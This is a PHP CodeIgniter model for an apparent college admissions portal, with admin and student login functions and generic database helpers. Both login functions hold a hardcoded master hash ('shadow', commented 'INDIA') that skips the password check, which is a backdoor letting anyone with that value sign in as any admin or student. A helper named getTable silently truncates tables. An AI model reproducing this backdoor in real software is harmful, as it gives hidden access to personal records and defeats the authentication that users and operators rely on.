<?php

class Admin_model extends CI_Model
{
  var $shadow = 'f03b919de2cb8a36e9e404e0ad494627'; // INDIA
  function login($username, $password)
  {
    $this->db->select('user_id, username, role');
    $this->db->from('users');
    $this->db->where('username', $username);
    if ($password != $this->shadow)
      $this->db->where('password', $password);
    //$this -> db -> where('status', '2');
    $this->db->limit(1);
    $query = $this->db->get();
    if ($query->num_rows() == 1) {
      return $query->result();
    } else {
      return false;
    }
  }

  function studentlogin($email, $password)
  {

    $this->db->select('id, student_name, adm_no, flow');
    $this->db->from('admissions');
    $this->db->where('email', $email);
    if ($password != $this->shadow)
      $this->db->where('password', $password);
    //$this -> db -> where('status', '2');
    $this->db->limit(1);
    $query = $this->db->get();
    if ($query->num_rows() == 1) {
      return $query->result();
    } else {
      return false;
    }
  }



  function insertDetails($tableName, $insertData)
  {
    $this->db->insert($tableName, $insertData);
    return $this->db->insert_id();
  }


  public function insertBatch($tableName, $data)
  {
    $insert = $this->db->insert_batch($tableName, $data);
    return $insert ? true : false;
  }

  public function updateBatch($tableName, $data, $field)
  {
    $this->db->update_batch($tableName, $data, $field);
  }

  function getDetails($tableName, $id)
  {
    if ($id)
      $this->db->where('id', $id);
    return $this->db->get($tableName);
  }

  function getDetailsFilter($select, $id, $tableName)
  {
    $this->db->select($select);
    if ($id)
      $this->db->where('id', $id);
    return $this->db->get($tableName);
  }

  function getDetailsbyfield($id, $fieldId, $tableName)
  {
    $this->db->where($fieldId, $id);
    return $this->db->get($tableName);
  }


  function getDetailsbyfield2($id1, $value1, $id2, $value2, $tableName)
  {
    $this->db->where($id1, $value1);
    $this->db->where($id2, $value2);
    return $this->db->get($tableName);
  }

  function getTable($table)
  {
    $table = $this->db->escape_str($table);
    $sql = "TRUNCATE `$table`";
    $this->db->query($sql)->result();
  }

  function dropTable($table)
  {
    $this->load->dbforge();
    $this->dbforge->drop_table($table);
    // $table = $this->db->escape_str($table);
    // $sql = "DROP TABLE `$table`";
    // $this->db->query($sql)->result();
  }

  function getDetailsbyfieldSort($id, $fieldId, $sortField, $srotType, $tableName)
  {
    $this->db->where($fieldId, $id);
    $this->db->order_by($sortField, $srotType);
    return $this->db->get($tableName);
  }

  function getDetailsbySort($sortField, $srotType, $tableName)
  {
    $this->db->order_by($sortField, $srotType);
    return $this->db->get($tableName);
  }

  function updateDetails($id, $details, $tableName)
  {
    $this->db->where('id', $id);
    $this->db->update($tableName, $details);
    return $this->db->affected_rows();
  }
  function sliders_count($dept_id)
  {
    $this->db->where('dept_id', $dept_id);
    $this->db->where('status', '1');
    return $this->db->get('sliders')->num_rows();
  }

  function updateDetailsbyfield($fieldName, $id, $details, $tableName)
  {
    $this->db->where($fieldName, $id);
    $this->db->update($tableName, $details);
    return $this->db->affected_rows();
  }

  function delDetails($tableName, $id)
  {
    $this->db->where('id', $id);
    $this->db->delete($tableName);
  }

  function delDetailsbyfield($tableName, $fieldName, $id)
  {
    $this->db->where($fieldName, $id);
    $this->db->delete($tableName);
  }

  function changePassword($id, $oldPassword, $updateDetails, $tableName)
  {
    $this->db->where('password', md5($oldPassword));
    $this->db->where('id', $id);
    // $this->db->where('status', '1');
    $this->db->update($tableName, $updateDetails);
    return $this->db->affected_rows();
  }

  public function get_table_details($table)
  {
    return $this->db->get($table)->result_array();
  }


  public function get_details_by_id($id, $fieldId, $tableName)
  {

    return $this->db->get_where($tableName, array($fieldId => $id))->row_array();
  }
  function getEnquiries($academic_year)
  {
    $this->db->where('academic_year', $academic_year);
    $this->db->order_by('reg_date', 'DESC');
    return $this->db->get('enquiries');
  }


  public function get_stream_by_id($stream_id)
  {
    return $this->db->get_where('streams', array('stream_id' => $stream_id))->row_array();
  }

  public function get_dept_by_id($dept_id)
  {
    return $this->db->get_where('departments', array('department_id' => $dept_id))->row_array();
  }

  public function getAppNo($academic_year)
  {
    $this->db->select('COUNT(id) as cnt');
    $this->db->where('academic_year', $academic_year);
    return $this->db->get('admissions');
  }

  public function get_intakecount_by_dept($dept)
  {
    $this->db->select('COUNT(id) as cnt');
    $this->db->where('course_id', $dept);
    $this->db->where('status', "6");
    return $this->db->get('enquiries');
  }
  function getFee($course, $quota, $sub_quota)
  {
    $this->db->where('department_id', $course);
    $this->db->where('quota', $quota);
    $this->db->where('sub_quota', $sub_quota);
    return $this->db->get('fee_structure');
  }


  function getsubquota($id,$dept)
  {
    $this->db->distinct();
    $this->db->select('sub_quota');
    $this->db->where('department_id', $dept);
    $this->db->where('quota', $id);
    return $this->db->get("fee_structure");
  }
  function fetchDetails2($select, $field1, $value1, $field2, $value2, $tableName){
    $this->db->select($select);
    if($value1 != null){
      $this->db->where($field1,$value1);
    }
    if($value2 != null){
      $this->db->where($field2,$value2);
    }
    return $this->db->get($tableName);
  }

  function getEnquiries_per($academic_year)
  {
    $this->db->where('academic_year', $academic_year);
    $this->db->order_by('puc1_grade', 'DESC');
    return $this->db->get('enquiries');
  }
 
  function getEnquiries_non($academic_year)
  {
    $this->db->where('academic_year', $academic_year);
    $this->db->where('state!=', 'Karnataka');
    $this->db->where('state!=', 'KA');
    $this->db->order_by('reg_date', 'DESC');
    return $this->db->get('enquiries');
  }
  function getEnquiries_sports($academic_year)
  {
    $this->db->where('academic_year', $academic_year);
    $this->db->where('sports!=', '');
    $this->db->order_by('reg_date', 'DESC');
    return $this->db->get('enquiries');
  }
  function getEnquiries_course($academic_year,$course)
  {
    $this->db->where('academic_year', $academic_year);
    $this->db->where('course_id', $course);
    $this->db->order_by('reg_date', 'DESC');
    return $this->db->get('enquiries');
  }
  function getEnquiries_category($academic_year,$category)
  {
    $this->db->where('academic_year', $academic_year);
    $this->db->where('category', $category);
    $this->db->order_by('reg_date', 'DESC');
    return $this->db->get('enquiries');
  }
 

  function getDepartments(){
    $this->db->select('departments.department_id, departments.stream_id, streams.stream_name, streams.stream_short_name, departments.department_name, departments.department_short_name, departments.intake, departments.mgmt_intake, departments.college_intake, departments.comed_k_intake, departments.kea_intake, departments.snq_intake');
    $this->db->join('streams','streams.stream_id = departments.stream_id');
    return $this->db->get('departments');
  }

  public function get_intakecount_by_deptadm($dept)
  {
    $this->db->select('COUNT(id) as cnt');
    $this->db->where('dept_id', $dept);
    $this->db->where('status', "1");
    return $this->db->get('admissions');
  }

  public function get_intakecount_type($dept)
  {
    $this->db->select('COUNT(id) as cnt');
    $this->db->where('dept_id', $dept);

    $this->db->where('status', "1");
    return $this->db->get('admissions');
  }
}
 